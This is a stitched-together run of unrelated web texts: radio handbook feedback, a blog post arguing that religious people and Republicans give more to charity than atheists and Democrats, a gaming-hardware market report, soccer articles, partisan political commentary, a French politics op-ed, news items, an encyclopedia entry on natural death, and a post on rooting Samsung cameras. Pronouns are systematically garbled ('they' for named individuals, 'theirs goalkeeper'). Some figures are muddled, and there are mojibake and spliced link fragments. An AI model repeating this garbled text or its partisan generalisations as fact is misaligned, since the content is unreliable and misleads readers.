“I still consider it useful, if the Handbooks also can provide the DX-er with additional information about Geographical Coordi-nates for their propagation calculations and Google Earth search, and ID in the language heard. Furthermore it is necessary to know current addresses (postal, e-mail and web) and QSL-policy for their reception report writing. For listeners with Broadband internet (ATDL) is it also useful to know, if the station broadcasts live audio on the web. Most of these useful details can be found in the WRTH, but they are still missing completely in the SWFG ! The Handbooks are very useful for the DX-er and ordinary shortwave listener and are at a very high accuracy level and can hardly be much better!”
———
This fantastic result is down to the extremely hard work and dedication of all our country editors, contributors, monitors and, of course, the 3 main international sub editors who gather the majority of the information for the section. Without their enormous knowledge and skill, the section would not be what it is today. Finally we must not forget the publisher who has, amongst many other things, the unenviable job of doing the final setting and making it all fit into the available space – more difficult than it sounds, believe me!! […]Best wishes and regards, Sean Gilbert – International Editor.

Well, let's take a look at the numbers with this article by Arthur Brooks, published by the Hoover Institute at Stanford University.
Excerpt:
How do religious and secular people vary in their charitable behavior? To answer this, I turn to data collected expressly to explore patterns in American civic life. The Social Capital Community Benchmark Survey (SCCBS) was undertaken in 2000 by researchers at universities throughout the United States and the Roper Center for Public Opinion Research. The data consist of nearly 30,000 observations drawn from 50 communities across the United States and ask individuals about their “civic behavior,” including their giving and volunteering during the year preceding the survey. From these data, I have constructed two measures of religious participation. First, the group I refer to as “religious” are the respondents that report attending religious services every week or more often. This is 33 percent of the sample. Second, the group I call “secular” report attending religious services less than a few times per year or explicitly say they have no religion. These people are 26 percent of the sample (implying that those who practice their religion occasionally make up 41 percent of the sample). The SCCBS asked respondents whether and how much they gave and volunteered to “religious causes” or “non-religious charities” over the previous 12 months. Across the whole population, 81 percent gave, while 57 percent volunteered. The differences in charity between secular and religious people are dramatic. Religious people are 25 percentage points more likely than secularists to donate money (91 percent to 66 percent) and 23 points more likely to volunteer time (67 percent to 44 percent). And, consistent with the findings of other writers, these data show that practicing a religion is more important than the actual religion itself in predicting charitable behavior. For example, among those who attend worship services regularly, 92 percent of Protestants give charitably, compared with 91 percent of Catholics, 91 percent of Jews, and 89 percent from other religions. Socioeconomically, the religious and secular groups are similar in some ways and different in others. For example, there is little difference between the groups in income (both have average household incomes around $49,000) or education level (20 percent of each group holds a college degree). On the other hand, the secular group is disproportionately male (49 percent to 32 percent), unmarried (58 percent to 40 percent), and young (42 to 49 years old, on average). In addition, the SCCBS data show that religion and secularism break down on ideological lines: Religious people are 38 percentage points more likely to say they are conservative than to say they are liberal (57 percent to 19 percent). In contrast, secular people are 13 points more likely to say they are liberal than to say they are conservative (42 percent to 29 percent). It is possible, of course, that the charity differences between secular and religious people are due to these nonreligious socioeconomic differences. To investigate this possibility, I used a statistical procedure called probit regression to examine the role of religious practice in isolation from all other relevant demographic characteristics: political beliefs, income (and hence, indirectly, the tax incentives for giving), education level, gender, age, race, marital status, and area of residence. The data show that if two people — one religious and the other secular — are identical in every other way, the secular person is 23 percentage points less likely to give than the religious person and 26 points less likely to volunteer.
Honestly, I've always struggled to understand how giving to charity could be rational, on atheism. If you are only alive for 80 years, and the purpose of your life is to be happy, then the only reason I can think of to give anything away to anyone is because it makes you feel happier or more respected or something. Maybe because you like thinking of yourself as moral, or maybe because you want to be seen as moral, or maybe because you want a tax deduction, or maybe something else. But if this is the only life you are ever going to have, and people are just collections of atoms, then why care about what anyone is doing? We're all just accidents anyway, on atheism, and we're going to die out eventually. There are no objective moral duties – we are accidents on the atheist view. One set of atoms giving some atoms to another set of atoms, and then in the end all the atoms get scattered: who cares?
Look:
In a universe of blind physical forces and genetic replication, some people are going to get hurt, other people are going to get lucky, and you won't find any rhyme or reason in it, or any justice. The universe that we observe has precisely the properties we should expect if there is, at bottom, no design, no purpose, no evil and no good, nothing but blind, pitiless indifference… DNA neither knows nor cares. DNA just is. And we dance to its music. (Richard Dawkins, River Out of Eden: A Darwinian View of Life (1995))
They may live better than that for whatever whim, but goodness is not rational within their worldview. And we want to be rational about morality, because as the numbers show, having a reason to be good makes a big difference in whether actually do good. As opposed to just claiming to be good. Anyone can say anything, but their rational beliefs are the rails on which they run their lives.
Here's something interesting I found about the leaders of the two political parties in this country.
Excerpt:
In 2009, the Obamas gave 5.9 percent of their income to charity, about the same as they gave in 2006 and 2007. In the eight years before they became president, Obama gave an average of 3.5 percent of their income to charity, upping that to 6.5 percent in 2008. The Obamas' charitable giving is equally divided between “hope” and “change.” George W. Bush gave away more than 10 percent of their income each year they were president, as they did before becoming president. Thus, in 2005, Obama gave about the same dollar amount to charity as President George Bush did, on an income of $1.7 million — more than twice as much as President Bush's $735,180. Again in 2006, Bush gave more to charity than Obama on an income one-third smaller than Obama's. In the decade before Joe Biden became vice president, the Bidens gave a total — all 10 years combined — of $3,690 to charity, or 0.2 percent of their income. They gave in a decade what most Americans in their tax bracket give in an average year, or about one row of hair plugs. Of course, even in Biden's stingiest years, they gave more to charity than Sen. John Kerry did in 1995, which was a big fat goose egg. Kerry did, however, spend half a million dollars on a 17th-century Dutch seascape painting that year, as Peter Schweizer reports in their 2008 book, “Makers and Takers.” To be fair, 1995 was an off-year for Kerry's charitable giving. The year before, they gave $2,039 to charity, and the year before that a staggering $175. They also dropped a $5 bill in the Salvation Army pail and almost didn't ask for change. In 1998, Al Gore gave $353 to charity — about a day's take for a lemonade stand in their neighborhood. That was 10 percent of the national average for charitable giving by people in the $100,000-$200,000 income brackets. Gore was at the very top of that bracket, with an income of $197,729. When Sen. Ted Kennedy released their tax returns to run for president in the '70s, they showed that Kennedy gave a bare 1 percent of their income to charity — or, as Schweizer says, “about as much as Kennedy claimed as a write-off on their 50-foot sailing sloop Curragh.” (Cash tips to bartenders and cocktail waiteres are not considered charitable donations.) The Democratic base gives to charity as their betters do. At the same income, a single mother on welfare is seven times less likely to give to charity than a working poor family that attends religious services. In 2006 and 2007, John McCain, who files separately from their rich wife, gave 27.3 percent and 28.6 percent of their income to charity. In 2005, Vice President Cheney gave 77 percent of their income to charity. They also shot a lawyer in the face, which I think should count for something. In a single year, Schweizer reports, Rush Limbaugh “gave $109,716 to ‘various individuals in need of assistance mainly due to family illnesses,' $52,898 to ‘children's case management organizations,' including ‘various programs to benefit families in need,' $35,100 for ‘Alzheimer's community care — day care for families in need,' and $40,951 for air conditioning units and heaters delivered to troops in Iraq.”
The Democrats are the non-religious party, the Republicans are the religious party. The Democrats are also the talking party, as you can see, and the Republicans are the doing party.
By the way, Arthur Brooks eventually turned this research into a book called “Who Really Cares?“, and it's a good response to atheists when they tell you that they can be moral without God. If it doesn't make sense to be moral, then atheists aren't going to do it. You can read more about that book here.
X86 is a major platform of choice
By Jon Peddie
The gaming hardware market is huge, and bewildering because of its diversity and the marketing hype associated with it. We've been monitoring and measuring the gaming market for over a decade, and felt it was time to share some of our findings and clear up some of the misunderstandings about the market and the suppliers. The major takeaway is that when x86-based gaming is examined, AMD is the clear winner.
Gaming falls into several camps, device size, main processor type, OS, screen size, budget, time spent, etc. The gaming community is so large; no single demographic can define it.
Partial demographic of the gamer community
Gamers also typically enjoy their hobby multiple ways, including owning multiple game consoles, PC gaming, and gaming at iCafe/net cafes and arcades.
For this report, we are looking strictly at x86-based machines used for gaming. Those machines fall into three platforms, consoles, notebooks, and desktops. And although some x86-based tablets were made and presumably could be used for gaming, we categorize them the same as an ARM-based device running Android, or a smaller version of windows, and are not included in this report because the gamer profile tends to be the same.
We define the market as consisting of three types of players: Enthusiast, Core gamer, and casual gamer. Included in the enthusiast class would be the professional gamers who play in tournaments for prize money or sponsorship. We do not make any distinction about gender, nor do we make any distinction about age, or geographic location. Generally speaking, these categories have to do with the amount time the gamers spend playing computer/video games, and the class or type of games being played.
The equipment a gamer has will depend upon their or their economic situation, so an Enthusiast may only be able to afford entry-level or mainstream equipment, or a last generation console, where a high-end gamer will have the latest PC, graphics add-in board (AIB) and/or the latest console; in between is the midrange equipment.
The hardware tiers are:
Entry-Level (Mainstream)
Mid-range (Performance)
High-End (Enthusiast)
The tiers for gamer time commitment are:
Light
Moderate (Casual)
Intensive (Core)
Extreme (Enthusiast)
To arrive at the equipment in use, we looked at the installed base of the latest consoles (Microsoft Xbox-One, Nintendo Wii and Wii U, and the Sony PS4). We also looked at the installed base of AIBs used for gaming and acquired over the past three years. And we looked at the installed base of integrated graphics in Notebooks (AMD APUs, Intel integrated).
Not all graphics AIBs go to gamers, but a good percentage of them do, and not many notebooks (with integrated graphics or discrete GPUs) are used for gaming. However, all consoles are used for gaming.
To arrive at the gaming AIBs model, we used the following diagram.
Based on Steam user data, we conclude that 16.5% of desktop machines used for gaming are using Intel integrated graphics (Southeast Asia represents about 6.5 percent of Valve's global Steam gamers). Steam data does not differentiate desktop from notebook integrated graphics. Therefore, we applied the same percentage to Intel for notebooks and based on the AMD to Intel integrated notebook ratio (our quarterly data collection of mobile integrated GPU shipments), normalized AMD's notebook integrated gamer utilization. We also used Steam data to estimate the market share for AMD and Nvidia mobile discrete GPUs used for gaming based on our quarterly data collection of mobile discrete GPU shipments. We used company financial reports to arrive at the shipments and installed base of gaming consoles. PC Data For the past seven years, the three major vendors installed base of GPUs for PC gaming declined slowly following the PC's decline.
The total gaming GPU systems installed today amount to over 800 million as shown in the following chart.
The list includes PCs used in gaming, PS3, PS4, PS4 pro, Xbox360, Xbox one, Wii, and WiiU.
If you just look at ×86-based gaming machines, you get the following chart.
The list includes PCs used in gaming, PS4, PS4 pro, Xbox360, and Xbox One.
With the gaming GPU hardware market being $30 billion dollars in 2016, growing to $33+ billion in 2019 the market opportunity is very large. The total gaming hardware market is even larger—over $290 billion in cumulative sales.
The gaming community of players using x86 consoles and PCs has over 800 million people participating in 2016, growing to 875 million in 2019. It is no wonder we pay special attention when it comes to the balance of power in gaming. Developers too should do the same as they often make significant business decisions when deciding on the platforms that they are targeting.
What do we think?
Intel is the volume leader in shipping integrated GPUs in the PC, however, only a small portion of them are used in gaming, Nvidia is the leader in discrete GPUs in the PC.
However, when we look at the x86 console and the PC market as a whole, the numbers above tell an interesting story. More gamers are playing on Radeon graphics than Intel and Nvidia combined. AMD's position in game consoles combined with a strong position in the PC market puts it in unique, market leading position when it comes to gamers. And that is a great position to be in when you think of upcoming gaming possibility of VR coming to market.

Oumar Ballo signed with Nashville SC on November 30 in the big group of first signings that also included GK Matt Pickens, Midfielder Matt Lagrassa, and forward Robin Shroot. Check out the profile for Matt Pickens here.
Ballo, 26, was born in Bamako, the capital and largest city of the landlocked West African country of Mali, and moved to the United States when they were just nine years old with their family. Ballo started playing soccer once they got to the US, and first started to come into the soccer scene in college, first at Community College of Baltimore County in 2011, and then the University of Maryland, Baltimore County (UMBC) from 2012 to 2014. While in college, Ballo made 80 career appearances (caps) for both schools and scored 7 goals. While in college, they also played in the Premier Development League, the fourth tier of US soccer, appearing in 21 games with the Baltimore Bohemians from 2012 to 2013, and in 7 for Reading United AC in 2014.
Upon graduating from UMBC, Ballo was selected in the second round with the 30th overall pick in the 2015 MLS SuperDraft by the Houston Dynamo. However, Ballo would be released by Houston in April of 2015 without making a first team appearance, either for the Dynamo, or for the Charleston Battery, the club they had been loaned to. Ballo would not be signed by any professional club until January 2016, when the Swope Park Rangers, the USL team affiliated with Sporting Kansas City, acquired him. In the next two seasons with Swope Park, Ballo would make 36 starts, and 45 total caps for the Rangers. They would also score a goal and assist on another in their time playing in Kansas City.
Sadly, there isn't as much video of Ballo as there is of Matt Pickens, but that's to be expected. Pickens had the benefit of playing in MLS for several years, and then playing for a heavily televised USL team down in Tampa Bay. Ballo has not yet played in MLS, so the pickings for highlights are scarce. However, I did manage to find a video showing Ballo scoring some goals for UMBC (skip to 0:50 to see their goals)
At 6'2″ tall, Ballo can be a dangerous target man during set pieces and corner kicks. We can expect to see them in the box often, where they can have the opportunity to work some of the magic we saw them perform while in college. Unfortunately, I was not able to find any videos of their work as a defender, but Ballo has played primarily center back, and will be a solid option for Gary Smith to start as one of their center backs. In their two seasons with Swope Park, Ballo has helped keep 11 clean sheets in the games they started and played all 90 minutes.
At 0:25 in the below video, take a look at Ballo's only goal for SPR:
Now, for the stat-heavy portion of the article. With so few highlights to show, hopefully the statistics of their play with SPR the past two seasons will shed some light on what we can expect from Ballo in 2018. In their two seasons with Swope Park, Ballo played 3205 minutes in 45 games. They made 87 clearances, blocked 16 shots (all in 2017), and made 44 interceptions. Their tackle success rate was 84% for both seasons. In one-on-one duels, Ballo won 76 of 129, for a success rate of about 59%, with that rate improving from 2016 to 2017, and they won 65% of the aerial duels they attempted. Overall, these are good numbers for a center back, and we can see through their clearances, blocks, and interceptions that they aren't afraid to get the ball out of danger by whatever means necessary.
Ballo attempted 1030 passes in both seasons, and completed 85% of them. Their pass success rate per 90 minutes was 24.6, with most of those coming within their own half, as to be expected from a center back. Ballo looks to be solid in the defensive half of the field, completing 92.6% of passes in their own half in 2017. This is exactly what one would want in a central defender: the ability to retain possession in the most vulnerable part of the pitch. They shouldn't just be giving the ball away by squandering possession through bad passing, and they really shouldn't do it when he's less than 40 yards from theirs goalkeeper.
Overall, Ballo looks pretty good on paper. He's got a good track record of being able to get the ball away from danger by tackles, interceptions, or clearances, and once he's got the ball, they help keep possession through great passing numbers. We'll know more about exactly where Ballo slots into Gary Smith's formation and tactical shape come February and the preseason friendly against Atlanta United, but don't be surprised if Ballo puts in a great showing of what he's capable of.

I love you, crazy ranting nutcase person.
I love you, crazy ranting nutcase person.
Saints be praised, this guy is amazing. Aficionados of the GOP's new move towards abject batshit insanity have found a new poster boy in inexplicable Virginia lt. gov. nominee E.W. Jackson. He's Allen West, but more prone to irrational fury. He's Louie Gohmert, but more incoherent. He's Steve King and Michele Bachmann, but with the hatefulness dialed up to eleven and a half. How the hell is it that the Republican Party just discovered this loon now? I would have thought they'd have shaken every tree in the conservative nut orchard by now, but no. Here comes a new guy, and he's Akin to be worse. (Get it? Get it? Ha, it's been months since we could use that one.) No, this guy seems to have been specially cloned in a Republican Lunatic Candidate vat, and you don't want to even know what they pump into that thing.
Jackson seems to have no intention of pacing himself, either. Are we really going to have a Daily Jackson Roundup? Here's just the stuff brought up recently:
They say that Senate Majority Leader Harry Reid is just "claiming" to be Mormon. For folks like Reid, they say "they don't believe it or feel it in their hearts." Bonus points to EW for telling this to Glenn Beck, who otherwise would be reduced to interviewing soup cans in their kitchen.
They say that the federal government shouldn't be involved in disaster relief—and that they don't think there's "any constitutional authority to do it." Forget budget offsets, silly Sens. Inhofe and Cornyn—the new crazy Republican position is that states that face devastating natural disasters can get bent.
In 2009, they founded their own tea partyesque group called STAND. While the top issue of the hardcore social conservative group was to create a yearly American History Month, in part to help offset the "balkanizing" influence of things like Black History Month and Gay Pride Month, the second "top issue" was to call for "an end to the hyphenated American." That this made it onto the list before such social conservative mantras as the anti-abortion and anti-marriage-equality planks is odd, and the nice text at the top of their web page declaring Jackson as "Standing Up For The Judeo-Christian History And Values Which Made America Great" would be outright embarrassing, if that really were a hyphen there describing Americans. It's not, though—that's just an ant on your computer screen. That's another ant on their left-hand sidebar, which means you must have been eating at your computer again.
He's on Twitter, and it's exactly what you'd expect.
As for their history of spectacularly nasty rhetoric calling homosexuals "sick people," Democrats "slave masters" and Planned Parenthood "the Ku Klux Klan," etc., Jackson isn't backing down. "I say the things that I say because I'm a Christian," they told reporters, adding "attacking me because I hold to those principles is attacking every church-going person." Well, glad we've cleared that up. They also say, "I do not retract anything that I said."
So he's an ardent social conservative who's into rhetoric about how the other side is like the Klan, who doubts other people really are the religions they say they are, who doesn't believe the federal government should help disaster victims, who thinks gays are "sick" and "ikky" and who wants to unite some hyphens against the other hyphens in order to end hyphens, all the while saying that if you attack them for being a f--king insane hatemonger you're persecuting them and all their fellow Christians. Was I right about them being cloned in a GOP "batshit crazy" vat, or what?
Welcome, Mr. Jackson, to the Republican big leagues. Oh, you're gonna fit right in. And if the Republicans don't erect a statue to you in the next few years, I am almost positive the Democrats will do it for them.
As nice a facility as it is, Gatineau's Complexe Branchaud-Briere isn't a great spot to gauge the play of a soccer team.
As Ottawa Fury FC was reminded once again during their pre-season friendly against the visiting Rochester Rhinos on Friday, the possession-oriented game the NASL club is built around gets tricky on the indoor pitch, which is both narrower and slightly shorter than a regular soccer field.
Fury showed flashes Friday of what it's building toward in a physical and somewhat sloppy 1-1 draw against the USL's Rochester Rhinos. Carl Haworth's 30th minute goal allowed Fury to remain undefeated through two pre-season games.
The forward picked up a lose ball at the top of the Rochester box, made a couple quick moves and had the Rhinos keeper moving the wrong way when Haworth's shot deflected off a defender and into the net.
“I was just looking for anything bouncing around the box and luckily it came right to me,” Haworth said of the goal.
As for playing on the smaller pitch, Haworth said it changes the dynamic of a game as both teams resorted to the long ball that mostly cut out the midfield — that is, when those long balls weren't bouncing off the roof.
“We still want to try and play as much as we can but you sort of have to change it to the conditions and you just have to fight for the balls,” Haworth said. “We want to try to play (our game and) keep the ball, but in the end you just have to go a bit more direct.”
With Ottawa's two keepers expected to split the duties in Friday's friendly, Romuald Peiser was pressed into service early when starter Marcel DeBellis was sent off for a 25th-minute tackle that took down the charging Rhinos player who was in all alone. Fury coach Marc Dos Santos was happy to see their team fight for the tying goal, even in an exhibition game, though they said it was tough to fairly evaluate their team's play on the smaller pitch.
“It becomes a little bit unrealistic at times (with) the ball hitting the ceiling,” they said. “We try to look at the little things (like) how fast can we get out of pressure in 1 vs. 1 situations, because they happen a lot.
Defender Mason Trafford said the team was happy to remain undefeated in the pre-season as Fury returns to training next week before travelling to Montreal for another friendly Friday.
“It's different playing on this pitch, it's smaller, you can see it's a bit scrappy and you get what you can out of it,” they said. “It's good that we got the tie in the end, that was important.”
Those who made the trip to Gatineau got to see Dos Santos experiment with a new formation, straying from their usual 4-3-3 (defenders-midfielders-forwards) to a 4-4-2 that saw Tommy Heinemann and newcomer Andrew Wiedeman playing together up top. Don't expect to see too much of that though, as Dos Santos said it had more to do with the pitch size, which took a lot of space away from the wingers.
There was a scary moment very early in this one when midfielder Nicki Paterson collided with a Rochester player, resulting in a gash on the Fury player's head. They were tended to, had their head wrapped in gauze and was back in the game immediately.
“End of my modelling career,” the Scotsman quipped.
The match also featured an appearance by Fury Academy player Mohamed Dagnogo, a Gatineau native who spent last year with the Montreal Impact's U18 squad.
JARUN AWAY
Fury FC has bid farewell to defender Omar Jarun.
The club confirmed Friday it had released the 6-foot-5 centre back shortly, a move freeing up a roster spot and eases some of the log jam on the team's crowded back line.
Just as the announcement came from Fury, it was announced Jarun had signed a deal with Indian Super League club Bharat FC.
Jarun signed a two-year deal with Ottawa before Fury's inaugural season but the club agreed to give the Kuwait native a chance to play elsewhere.
"Omar is part of the history of the club," said Fury head coach Marc Dos Santos. "This decision provides the club with roster flexibility while allowing Omar to find a new challenge abroad. I wish Omar the very best in the next chapter of their career."
Jarun scored twice in 16 appearances with Fury last season and also helped the Palestine national team win the AFC Challenge Cup.
"I want to thank Ottawa Fury FC for having me be part of the club's foundation," Jarun said in a statement. "My wife and I enjoyed living in Ottawa and being part of the community. I will continue to remain in touch with my teammates, the front office and the coaching staff and wish everyone well for the upcoming season and beyond."
Fury currently has 20 players under contract for the upcoming season.

Elevating French Jewry
It was a golden opportunity. Four Jews had just been killed by a Muslim gunman. Accused of inciting ethnic conflict, the French President's reelection campaign had been given the chance to repair the damage. All it had to do was recast the ex-Minister of the Interior as a tough cop who prioritized the security of the Jewish community.
They'd planned on kidnapping a Jewish judge. They were guilty of anti-Semitic preaching. Throughout the day, news anchors repeated the same statements, as images of heavily armed French police officers, rushing into darkened houses, ran across the TV screen. Suspects were paraded visibly handcuffed, their jackets pulled over their heads.
The second set of raids within a week, two weeks following the killings at a Jewish religious academy in Toulouse by a young Frenchman of Algerian background, the operation had begun. Islamic activists were being rounded up for questioning, and either prosecution, or emergency expulsion. Predictably, some were Algerian. Another was reported to be from Mali.
Nicolas Sarkozy was clearly making the most of it, providing a live commentary on the raids on French radio right as they were taking place. Despite being praised for their handling of the killings, France's President had not benefited from them, as had been anticipated by the press. Polls were predicting a Socialist win, with up to 30% of voters estimated to be sitting out the elections. The economy was rumored to be more pressing. Sarkozy had to do something. They called on the security forces.
If you were Jewish, the message being broadcast was of direct consequence. You either felt reassured that the French government was proactively seeking out persons who had harmed your kin. Or, you assumed that this was an obvious bit of electioneering, aimed at restoring the confidence of law and order-minded voters, eighteen days before national elections. All the demographics were getting worked.
It was a classic Sarkozy conundrum, which, if they win France's elections, will stand as a testimony to their skill at bridging enormous political differences. Seeking out the support of Jews, on the one hand, and nationalists, on the other, is not an easy task. Some of those Jews will, ironically, be of North African origin. Most of the rightists will be, undoubtedly, anti-Arab white ethnics, the type of voters for whom little distinguishes Muslim from Jew.
Having conducted a reelection effort that has, in part, conflated the two, by advocating the banning of both kosher and halal meat products (slaughtered according to both Jewish and Muslim ritual proscription,) at the time of the Toulouse killings, Sarkozy was being accused of attacking one of their core groups of supporters in order to appeal to racists attracted to their competitor, Marine Le Pen. What better way to make up for this than staging a highly choreographed series of arrests of French Arabs.
The idea that Jewish voters will support a politician who persecuted Muslims is not new. American Jews are especially familiar with appeals to their fear of Islam, particularly in relation to the Arab-Israeli conflict. The belief that French Jews would respond to such outreach is belied by infrequent violence between the two communities, as evinced by what had just taken place in Toulouse. Some might argue that, in fact, Sarkozy was working a more justifiably anxious Jewish community than its American counterpart.
And yet, as though to underline the cynicism of their response to the Toulouse killings was their party's singling out of kosher, in addition to halal foods, as threats to French cultural identity. Initially calling for the “labeling” of meats slaughtered according to Jewish and Islamic ritual proscriptions, Sarkozy was soon followed by Prime Minister François Fillon, who urged France's Muslims and Jews to consider scrapping their dietary laws altogether.
Tying Sarkozy's and Fillon's attacks on halal and kashrut to the French right's campaign against multiculturalism was Interior Minister Claude Guéant, who cautioned that awarding immigrants voting rights would result in Muslim majority city counsels imposing halal meat on school kitchens. “This is quite possible, given the proportion of foreigners in some areas,” Geant told France's RTL radio.
Though some will argue that the scapegoating of Judeo-Muslim dietary laws was aimed at Arabs, Sarkozy's decision to target Jews nonetheless introduced an element of anti-Semitism into their campaign that took many by surprise. The UMP's effort also took a direct page from extremists, insofar as it succeeded in equating Jews with immigrants, by twinning Islamic and Jewish dietary laws, as being equally threatening and foreign.
This move was especially confounding considering the efforts made by populist parties to court Jewish voters in recent years, the National Front's Marine Le Pen included. What was Sarkozy thinking? Predictably, it was all too consistent with the French President's efforts to appear more rightwing than Le Pen, in order to draw away their most radical supporters. At the very least, it would help distance Sarkozy from their own immigrant and Jewish background (he is 1/4 Jewish, on their mother's side) which ideally broadens their appeal.
For students of European populism, however, there is something instructive here. If Nicolas Sarkozy has made any ‘breakthrough' in this campaign, it has been their explicit elision of anti-Semitism and Islamophobobia. It may not have been intentional. It could very well have been a risk they had decided to take. However, they did it, and it has helped confirm what immigrants and activists have been saying for years, especially in Germany.
Islamophobia is not just an event unto itself, by itself, reflecting a fundamental discomfort with the Muslim religion, and the religious culture of immigrants from the Middle East. In post-Cold War Europe, it also functions as a substitute for anti-Semitism, and, simultaneously, as an incubator of that very same prejudice. It was only a matter of time before things came full circle, and someone thought it safe enough to mention Jews again.
That it was Nicolas Sarkozy who would be the one to let the cat out of the bag is entirely in keeping. Though they are not rabbinically ‘Jewish', the French President has consistently leveraged their religious background for support, leaving open the possibility that they might just as well marginalize French Jewry if it suited him. It's complex, for sure. However, it is highly reflective of Sarkozy's own conflicts as a conservative of foreign background, who has consistently rationalized religion and ethnicity for political gain.

MEMPHIS, Tenn. -- Nidal Maghrbi came to the United States when they were 8 years old but is now a citizen. They now work at their uncle's store, called William's Market, near Mississippi Boulevard in South Memphis, but everybody knows them there as Nick.
A few weeks ago, a customer came in. Maghrbi said they had been drinking.
“She wanted $2 to borrow for beer and I couldn't give it to her,” Maghrbi said.
They said they got angry and made racist comments to him.
“She said, 'You guys come to our country and take over our stores and stuff.' Well, it's not my fault my parents brought me here, they just wanted me to have a good life," Maghrbi said.
The woman called police, telling them Maghrbi agreed with the beheading of Americans and that they knew about ISIS plans to blow up the I-55 bridge. Officers wrote in their report that the woman was drunk when they spoke to them, but still alerted the FBI.
“Is they a terrorist? That's my boy there, been knowing them a while, ain't nothing like that,” one of Maghrbi's customers said.
Many customers at the store said they support them and said they help them in hard times. WREG cameras had already seen it happen; earlier, a woman walked in and asked if they could have some diapers and pay them tomorrow. Maghrbi didn't hesitate to agree.
An FBI spokesperson says it's their responsibility to look into any and all tips regarding terrorists no matter where they come from, but the FBI doesn't investigate based on someone's race.
WREG attempted to locate the woman who made the complaint but was unsuccessful.
"Natural death" redirects here. For Horse the Band's album, see A Natural Death
A death by natural causes, as recorded by coroners and on death certificates and associated documents, is the end result of an illness or an internal malfunction of the body not directly caused by external forces, typically due to old age. This is especially true when an elderly person has several different conditions or diseases, but where it appears that none of them alone or together may clearly lead to the death, and it is uncertain which condition was the final factor causing death. For example, a person dying from complications from influenza (an infection), a heart attack (an internal body malfunction), or sudden heart failure would be listed as having died from natural causes. Health departments discourage listing old age as the cause of death because doing so does not benefit public health or medical research.[1] Old age is not a scientifically recognized cause of death; there is always a more direct cause, although it may be unknown in certain cases and could be one of a number of aging-associated diseases.
Terminology [ edit ]
By contrast, death caused by active intervention is called unnatural death. The "unnatural" causes are usually given as accident (implying no unreasonable voluntary risk), misadventure (an accident following a willful and dangerous risk, which can include drug or alcohol overdose), suicide, or homicide.[2] In some settings, other categories may be added. For example, a prison may track the deaths of inmates caused by acute intoxication separately.[3] Additionally, a cause of death can be recorded as "undetermined".[4]
Senate Democrats have jettisoned President Obama's proposal to raise taxes on families making more than $250,000, raising the threshold to $1 million in an attempt to win more Democratic votes.
Democratic leaders say they want to impose a 5 percent surtax on the tax liability of millionaires, which would raise about $445 billion over 10 years — roughly the cost of Obama's jobs proposal.

Even with the overhaul of Obama's jobs package, Senate Majority Leader Harry Reid Harry Mason ReidBottom Line Brennan fires back at 'selfish' Trump over Harry Reid criticism Trump rips Harry Reid for 'failed career' after ex-Dem leader slams them in interview MORE (D-Nev.) said they were not certain it would gain unanimous Democratic support. But Democratic leaders believe the change will broaden the bill's popularity in their caucus.
“We're going to move to have the richest of the rich pay a little bit more,” Reid said at a Wednesday press conference.
“Drawing the line at a million dollars is the right thing to do. In the eyes of many, it is hard to ask more of households that make $250,000 or $300,000 a year. They are not rich,” said Sen. Charles Schumer Charles (Chuck) Ellis SchumerBrennan fires back at 'selfish' Trump over Harry Reid criticism Trump rips Harry Reid for 'failed career' after ex-Dem leader slams them in interview Harry Reid: 'I don't see anything' Trump is doing right MORE (N.Y.), chairperson of the Democratic Policy Committee. "In large parts of the country that kind of income does not get you a big home or lots of vacations or anything else that is associated with wealth in America."
Schumer, who represents New York's borough of Manhattan, one of the wealthiest parts of the country, and the rich enclaves of Long Island and Westchester County, has long pushed to raise the threshold on raising taxes to a million dollars. They argue it's a cleaner political argument for Democrats to make.
On Wednesday, Schumer said raising taxes on families earning more than $250,000 a year, as Obama has long supported, would affect small businesses, an argument that is more associated with Republicans than Democrats.
"It also would affect too many small businesses if you drew the line below a million dollars," they said. "There are businesses, small businesses, that struggle. So we believe the million dollars is the right line because in many parts of the country there are two-income households that earn that much. That doesn't make them rich."
Schumer said families and businesses that earn between $250,000 and $1 million are "firmly in the middle class."

You can read about how they began the mod technically here. The short story is the OS is “rooted” and thus opened up to modification and third party software patches.
Developer search
I just want to echo the call from the developer for more people to get involved in the NX homebrew community –
“Seeing how there is a (yet small) community of tinkerers around the NX300 camera, and with the knowledge that a whole range of Samsung NX cameras comes with Tizen-based firmware (NX1, NX200, NX2000, NX300M, …?), the author has created a repository and a Wiki on GitHub. “Feel free to contribute to the wiki or the project – every input is welcome, starting from transferring information from the blog posts linked above into a more structured form in the wiki, and up to creating firmware modifications to allow for exciting new features.”
It is an interesting to me that Samsung once reached out to Magic Lantern about a possible collaboration.
For me looking at the smartphone app market it is insane that the large camera manufacturers haven't embraced this more fully.
Maybe if Samsung do pull the plug on the current camera lineup according to a raft of rumours, they can come back with a truly ‘smart' platform.

"Neither presidential primary is truly over yet, but Sen. Ted Cruz threw down the first gauntlet of the 2016 veepstakes Wednesday, naming former Hewlett-Packard CEO Carly Fiorina as their running mate during a rally in Indianapolis," Dispatch Washington reporter Jessica Wehrman writes.
Want to know what�s happening in Ohio government and politics from Columbus to Washington, D.C.? The Columbus Dispatch has you covered.
The Cruz-Fiorina ticket: �Neither presidential primary is truly over yet, but Sen. Ted Cruz threw down the first gauntlet of the 2016 veepstakes Wednesday, naming former Hewlett-Packard CEO Carly Fiorina as their running mate during a rally in Indianapolis,� Dispatch Washington reporter Jessica Wehrman writes.
In a 4 p.m. announcement that their campaign had teased all day, Cruz called Fiorina � an individual who I trust.��
A change in the day�s narrative? �Cruz made their announcement one day after billionaire Donald Trump swept primaries in five states, winning them with as much as 64 percent of the vote in Rhode Island,� Wehrman writes. �Cruz came in second in only Pennsylvania, Ohio Gov. John Kasich�s home state. Kasich came in second in Connecticut, Rhode Island, Maryland and Delaware.�
What Team Kasich said: "Carly Fiorina ran an honorable campaign but most Republicans will meet this decision with a collective shrug," said Mike Schrimpf, a Kasich campaign spokesperson.
Will Kasich name a running mate soon? On Sunday, Kasich said their team had begun the vetting process. �We have some old hands now who are beginning to do that. These things come quickly, and you don't want to have yourself in position where you have got to pick somebody out of a hat."
But... �Cruz has set a precedent, so don't be surprised if Kasich follows suit at some point. But to counter immediately with their choice would only make them seem like a copycat. No one from Team Kasich wanted to offer shortlist names as Cruz prepared to make their announcement," cleveland.com�s Henry Gomez writes.
***
Yeah, about the Kasich-Cruz alliance: �The Ohio governor canceled some public events after striking a deal with Mr. Cruz to cede certain states to each other , but Mr. Kasich still met privately Tuesday in Indianapolis with about two dozen convention delegates and other prominent Republicans. They also attended two fundraisers,� Wall Street Journal reporter Beth Reinhard writes.
